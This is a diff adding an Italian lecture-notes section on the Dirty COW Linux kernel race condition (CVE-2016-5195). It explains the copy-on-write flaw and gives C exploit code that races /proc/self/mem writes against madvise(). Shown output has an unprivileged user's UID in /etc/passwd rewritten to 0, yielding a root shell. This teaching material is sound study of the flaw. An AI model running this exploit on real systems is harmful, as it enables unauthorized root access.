@@ -6,6 +6,7 @@
 \usepackage{float}
 \usepackage{tikz}
 \usepackage{circledsteps}
+\usepackage{enumitem}
 \title{Sicurezza nelle reti}
 \author{Giulia}
 \date{\today}
@@ -487,5 +488,161 @@ $ cat /zzz
     \item \textbf{Dopo \texttt{madvise()}}: il contenuto torna a quello originale, poiché la copia privata viene scartata e la tabella delle pagine punta di nuovo alla memoria fisica originale.
     \item \textbf{Il file \texttt{/zzz} non è mai stato modificato}: le modifiche riguardano esclusivamente la copia in memoria del processo.
 \end{itemize}
+
+
+\subsection*{La vulnerabilità Dirty COW}
+
+Come visto in precedenza, quando un processo tenta di scrivere in una memoria mappata con \texttt{MAP\_PRIVATE}, il sistema operativo esegue tre passi fondamentali:
+
+\begin{enumerate}[label=(\Alph*)]
+    \item \textbf{Crea una copia} della pagina di memoria mappata (nuova memoria fisica).
+    \item \textbf{Aggiorna la tabella delle pagine}, in modo che la memoria virtuale del processo punti alla nuova memoria fisica appena creata.
+    \item \textbf{Scrive nella memoria} (sulla copia privata).
+\end{enumerate}
+
+Questi tre passi \textbf{non sono atomici}: possono essere interrotti da altri thread. Questa non-atomicità crea una \textbf{race condition} che costituisce la base della vulnerabilità \textbf{Dirty COW} (CVE-2016-5195).
+
+\subsection*{Come viene sfruttata la race condition}
+
+Se la chiamata \texttt{madvise()} con \texttt{MADV\_DONTNEED} viene eseguita da un altro thread \textbf{tra il passo B e il passo C}, si verifica la seguente sequenza critica:
+
+\begin{enumerate}
+    \item Il \textbf{passo B} aggiorna la tabella delle pagine: la memoria virtuale punta alla copia privata 2.
+    \item \texttt{madvise()} \textbf{annulla il passo B}: la tabella delle pagine viene riportata a puntare alla memoria originale 1.
+    \item Il \textbf{passo C} scrive nella memoria fisica puntata dalla tabella delle pagine, che ora è 1 (la memoria originale, condivisa col file), invece della copia privata.
+    \item Le modifiche alla memoria 1 vengono \textbf{propagate al file sottostante}, causando la modifica di un file di sola lettura da parte di un utente non privilegiato.
+\end{enumerate}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{immagini/13.png}
+\end{figure}
+
+
+\noindent\textbf{Nota importante:} quando viene avviata la chiamata di sistema \texttt{write()}, il kernel verifica la protezione della memoria mappata. Quando rileva che si tratta di memoria CoW, attiva i passi A, B, C senza effettuare un secondo controllo (\textit{double-check}) sullo stato aggiornato della tabella delle pagine. Questo è il difetto fondamentale.
+
+\subsection*{Idea di base dell'attacco}
+
+Per sfruttare la vulnerabilità è necessario eseguire \textbf{due thread in competizione}:
+
+\begin{itemize}
+    \item \textbf{Thread 1 (write thread)}: scrive continuamente nella memoria mappata tramite \texttt{write()} su \texttt{/proc/self/mem}.
+    \item \textbf{Thread 2 (madvise thread)}: scarta continuamente la copia privata della memoria mappata tramite \texttt{madvise(..., MADV\_DONTNEED)}.
+\end{itemize}
+
+I due thread vengono messi in competizione finché la loro interazione non produce la scrittura sulla memoria originale (e quindi sul file sottostante).
+
+\subsection*{Caso pratico: attacco a \texttt{/etc/passwd}}
+
+\texttt{/etc/passwd} è un file di sola lettura per gli utenti non privilegiati. La struttura di un record è la seguente:
+
+\begin{lstlisting}[language=bash]
+$ cat /etc/passwd | grep testcow
+testcow:x:1001:1003:,,,:~/home/testcow:/bin/bash
+\end{lstlisting}
+
+Il \textbf{terzo campo} rappresenta lo \textbf{User ID (UID)}. L'utente \texttt{root} ha UID = 0. L'obiettivo dell'attacco è modificare il record di \texttt{testcow} sostituendo \texttt{1001} con \texttt{0000}, trasformando di fatto l'utente in root.
+
+\subsection*{Il codice dell'attacco}
+
+\subsubsection*{Thread principale (\texttt{main})}
+
+Il thread principale si occupa di configurare la mappatura della memoria e di lanciare i due thread:
+
+\begin{lstlisting}[language=C, caption={Thread principale dell'attacco Dirty COW}]
+void *map;
+
+int main(int argc, char *argv[])
+{
+    pthread_t pth1, pth2;
+    struct stat st;
+    int file_size;
+
+    // Apre il file /etc/passwd in sola lettura
+    int f = open("/etc/passwd", O_RDONLY);
+
+    // Mappa il file in memoria COW con MAP_PRIVATE
+    fstat(f, &st);
+    file_size = st.st_size;
+    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+    // (1) Trova la posizione del record target nel file mappato
+    char *position = strstr(map, "testcow:x:1001"); // (1)
+
+    // (2) Crea il thread madvise (scarta la copia privata)
+    pthread_create(&pth1, NULL, madviseThread, (void *)file_size); // (2)
+
+    // (3) Crea il thread write (scrive nella memoria mappata)
+    pthread_create(&pth2, NULL, writeThread, position); // (3)
+
+    // Attende la fine dei thread
+    pthread_join(pth1, NULL);
+    pthread_join(pth2, NULL);
+    return 0;
+}
+\end{lstlisting}
+
+\begin{itemize}
+    \item \textbf{Riga 1}: individua la posizione esatta nella memoria mappata in cui si trova il record dell'utente \texttt{testcow}.
+    \item \textbf{Riga 2}: crea il thread che chiama ripetutamente \texttt{madvise()} per annullare la copia privata.
+    \item \textbf{Riga 3}: crea il thread che tenta ripetutamente di scrivere nella memoria tramite \texttt{/proc/self/mem}.
+\end{itemize}
+
+\subsubsection{I due thread}
+
+\begin{lstlisting}[language=C, caption={writeThread e madviseThread}]
+void *writeThread(void *arg)
+{
+    char *content = "testcow:x:0000";
+    off_t offset = (off_t) arg;
+
+    // Apre lo pseudo-file di memoria del processo
+    int f = open("/proc/self/mem", O_RDWR);
+
+    while (1) {
+        // Sposta il puntatore alla posizione del record target
+        lseek(f, offset, SEEK_SET);
+        // Scrive nella memoria (tenta di attivare la race condition)
+        write(f, content, strlen(content));
+    }
+}
+
+void *madviseThread(void *arg)
+{
+    int file_size = (int) arg;
+
+    while (1) {
+        // Scarta la copia privata, riportando la tabella
+        // delle pagine alla memoria originale
+        madvise(map, file_size, MADV_DONTNEED);
+    }
+}
+\end{lstlisting}
+
+\begin{itemize}
+    \item \textbf{writeThread}: tenta in loop di sovrascrivere \texttt{"testcow:x:1001"} con \texttt{"testcow:x:0000"} nella memoria del processo tramite \texttt{/proc/self/mem}.
+    \item \textbf{madviseThread}: chiama in loop \texttt{madvise()} per annullare continuamente la copia privata, sperando di intercettarsi tra i passi B e C di \texttt{write()}.
+\end{itemize}
+
+\subsection*{Risultato dell'attacco}
+
+\begin{lstlisting}[language=bash]
+seed@ubuntu:$ gcc cow_attack_passwd.c -lpthread
+seed@ubuntu:$ a.out
+   ... press Ctrl-C after a few seconds ...
+seed@ubuntu:$ cat /etc/passwd | grep testcow
+testcow:x:0000:1003:,,,:~/home/testcow:/bin/bash   <- UID diventa 0!
+seed@ubuntu:$ su testcow
+Password:
+root@ubuntu:#   <- Shell di root ottenuta!
+root@ubuntu:# id
+uid=0(root) gid=1003(testcow) groups=0(root),1003(testcow)
+\end{lstlisting}
+
+Grazie alla race condition, la scrittura \textbf{bypassa il meccanismo CoW} e modifica direttamente il file \texttt{/etc/passwd} (di sola lettura), cambiando l'UID di \texttt{testcow} da \texttt{1001} a \texttt{0}. L'utente può quindi eseguire \texttt{su testcow} e ottenere una \textbf{shell con privilegi di root}.
+
+
+
+
 \end{document}
 
